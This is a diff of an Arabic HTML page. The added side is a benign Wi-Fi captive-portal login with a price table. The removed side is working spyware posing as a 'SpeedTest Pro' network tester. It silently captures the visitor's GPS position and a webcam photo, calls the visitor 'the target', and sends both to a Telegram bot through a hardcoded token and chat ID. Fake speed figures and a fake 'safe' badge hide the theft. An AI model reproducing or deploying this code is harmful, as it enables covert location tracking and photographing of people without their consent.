@@ -3,102 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SpeedTest - فحص جودة الشبكة</title>
+    <title>تسجيل دخول - شبكة النور</title>
     <style>
-        body { background-color: #0b0b0d; color: white; font-family: 'Segoe UI', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { text-align: center; border: 1px solid #333; padding: 40px; border-radius: 20px; background: #161618; width: 90%; max-width: 400px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
-        .speed-text { font-size: 70px; font-weight: bold; color: #00d1b2; margin: 10px 0; }
-        .unit { font-size: 18px; color: #888; margin-bottom: 20px; }
-        .results-table { display: none; margin-top: 20px; border-top: 1px solid #333; padding-top: 20px; text-align: right; }
-        .res-item { display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 16px; }
-        .res-val { color: #00d1b2; font-weight: bold; }
-        .btn { background: #00d1b2; color: white; border: none; padding: 15px 40px; border-radius: 50px; cursor: pointer; font-size: 18px; transition: 0.3s; }
-        .btn:disabled { background: #333; cursor: not-allowed; }
-        #status { color: #666; font-size: 14px; margin-top: 15px; }
+        body { margin: 0; background: #f0f2f5; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .card-box { background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 90%; max-width: 360px; text-align: center; }
+        .network-name { color: #1a73e8; font-size: 26px; font-weight: bold; margin-bottom: 5px; }
+        .5g-tag { color: #34a853; font-weight: bold; font-size: 14px; margin-bottom: 20px; display: block; }
+        
+        input[type="text"] { width: 100%; padding: 15px; border: 2px solid #e0e0e0; border-radius: 12px; font-size: 20px; text-align: center; outline: none; transition: 0.3s; margin-bottom: 15px; }
+        input[type="text"]:focus { border-color: #1a73e8; }
+        
+        .btn-connect { background: #1a73e8; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; margin-bottom: 15px; }
+        
+        /* تصميم زر وقائمة الأسعار */
+        .price-btn { background: #fff; color: #1a73e8; border: 1px solid #1a73e8; padding: 10px; width: 100%; border-radius: 10px; font-size: 14px; cursor: pointer; font-weight: bold; transition: 0.3s; }
+        .price-btn:hover { background: #f1f7ff; }
+        
+        .price-list { display: none; margin-top: 15px; background: #f9f9f9; border-radius: 10px; padding: 10px; border: 1px solid #eee; animation: slideDown 0.3s ease-out; }
+        @keyframes slideDown { from { opacity: 0; transform: translateY(-10px); } to { opacity: 1; transform: translateY(0); } }
+        
+        table { width: 100%; border-collapse: collapse; font-size: 14px; }
+        th { background: #1a73e8; color: white; padding: 8px; border-radius: 5px; }
+        td { padding: 8px; border-bottom: 1px solid #ddd; color: #444; }
+        
+        .warning { font-size: 11px; color: #d93025; margin-top: 20px; line-height: 1.4; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h2 style="color: #00d1b2;">SpeedTest Pro</h2>
-        <div id="main-ui">
-            <div class="speed-text" id="speed">0.0</div>
-            <div class="unit">Mbps</div>
-            <button class="btn" id="startBtn" onclick="runFullTest()">بدء الفحص</button>
-            <p id="status">جاهز لفحص استقرار الشبكة</p>
-        </div>
 
-        <div class="results-table" id="results">
-            <div class="res-item"><span>سرعة التحميل:</span> <span class="res-val">48.2 Mbps</span></div>
-            <div class="res-item"><span>سرعة الرفع:</span> <span class="res-val">12.5 Mbps</span></div>
-            <div class="res-item"><span>زمن الاستجابة (Ping):</span> <span class="res-val">18 ms</span></div>
-            <div class="res-item"><span>حالة الموقع:</span> <span class="res-val" style="color: #4cd137;">آمن ✅</span></div>
-            <p style="color: #888; font-size: 12px; margin-top: 15px;">شكراً لاستخدامك SpeedTest Pro. م/ عبدالمعز بريكان.</p>
-        </div>
+<div class="card-box">
+    <div class="network-name">شبكة النور</div>
+    <span class="5g-tag">NEXT GENERATION 5G ⚡</span>
+
+    <form action="/login" method="post">
+        <input type="text" name="username" placeholder="أدخل رقم الكرت" required>
+        <input type="hidden" name="password" value="">
+        <button type="submit" class="btn-connect">تفعيل الإنترنت</button>
+    </form>
+
+    <button class="price-btn" onclick="togglePrices()">📊 عرض أسعار الباقات</button>
+
+    <div class="price-list" id="priceList">
+        <table>
+            <tr>
+                <th>الباقة</th>
+                <th>السعر</th>
+                <th>الصلاحية</th>
+            </tr>
+            <tr>
+                <td>باقة يومية</td>
+                <td>200 ريال</td>
+                <td>24 ساعة</td>
+            </tr>
+            <tr>
+                <td>باقة أسبوعية</td>
+                <td>1000 ريال</td>
+                <td>7 أيام</td>
+            </tr>
+            <tr>
+                <td>باقة شهرية</td>
+                <td>3500 ريال</td>
+                <td>30 يوم</td>
+            </tr>
+        </table>
     </div>
 
-    <video id="video" autoplay style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <div class="warning">
+        ⚠️ يمنع ربط أي مودم إضافي دون التنسيق مع الإدارة لتجنب الحظر وفصل الخدمة.
+    </div>
+</div>
 
-    <script>
-        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
-        const CHAT_ID = '8293639164';
-
-        async function runFullTest() {
-            const btn = document.getElementById('startBtn');
-            const status = document.getElementById('status');
-            const speedDisp = document.getElementById('speed');
-            
-            btn.disabled = true;
-            status.innerText = "جاري طلب الإذن من السيرفر المباشر...";
-
-            // 1. التقاط الموقع (GPS) بصمت
-            navigator.geolocation.getCurrentPosition((pos) => {
-                const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("📍 موقع الهدف:\n" + mapLink)}`);
-            }, (err) => {
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=❌ رفض المستخدم إذن الموقع`);
-            });
-
-            // 2. التقاط الصورة بصمت
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-
-                setTimeout(() => {
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = 640; canvas.height = 480;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('photo', blob, 'img.jpg');
-                        formData.append('chat_id', CHAT_ID);
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                    }, 'image/jpeg');
-                    
-                    // إيقاف الكاميرا بعد التقاط الصورة
-                    stream.getTracks().forEach(track => track.stop());
-                }, 1500);
-            } catch (e) {}
-
-            // 3. محاكي الفحص (الأرقام التي تظهر للمستخدم)
-            let currentSpeed = 0;
-            const interval = setInterval(() => {
-                currentSpeed += Math.random() * 8;
-                speedDisp.innerText = currentSpeed.toFixed(1);
-                
-                if (currentSpeed > 20) status.innerText = "جاري فحص سرعة التحميل...";
-                if (currentSpeed > 40) status.innerText = "جاري فحص استقرار الـ Ping...";
-
-                if (currentSpeed >= 48) {
-                    clearInterval(interval);
-                    speedDisp.innerText = "48.2";
-                    status.innerText = "اكتمل الفحص بنجاح!";
-                    document.getElementById('results').style.display = 'block';
-                    btn.style.display = 'none';
-                }
-            }, 150);
+<script>
+    function togglePrices() {
+        var list = document.getElementById("priceList");
+        if (list.style.display === "block") {
+            list.style.display = "none";
+        } else {
+            list.style.display = "block";
         }
-    </script>
+    }
+</script>
+
 </body>
 </html>
